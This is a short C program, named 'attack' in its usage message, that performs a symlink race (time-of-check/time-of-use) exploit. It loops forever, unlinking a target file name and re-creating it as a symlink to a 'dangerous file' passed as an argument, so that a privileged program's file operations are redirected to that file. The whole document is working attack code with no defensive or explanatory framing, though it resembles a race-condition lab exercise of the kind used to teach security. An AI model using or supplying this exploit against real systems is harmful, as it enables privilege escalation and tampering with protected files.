#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>

int symlink(const char *target, const char *linkpath);
int unlink(const char *pathname);


int main(int argc, char *argv[]){

	if(argc != 3){
		fprintf(stderr, "Please enter 2 args as file_1 and file_2\nUsage: ./attack file_1 file_2\n");
		return -1;
	}

	// Let's switch the file by linking a new same-name input file to a dangerous file passed as argv[2]
	while(1){

        	// 1 - Let's try to remove the file by unlink() syscall

        	if(unlink(argv[1]) != 0){
                	// Cannot remove the file
                	perror("Unlink error: ");
                	fprintf(stderr, "Cannot remove the file, errno = %d\n", errno);
                	return -1;
        	}


	        // 2 - Create the link by symlink() using the first input file name as argument
	        if(symlink(argv[2], argv[1]) != 0){
			// Cannot create the symlink
	                perror("Symlink error: ");
	                fprintf(stderr, "Failed link, errno = %d\n", errno);
	                return -1;
	        }

	}
	return 0;
}
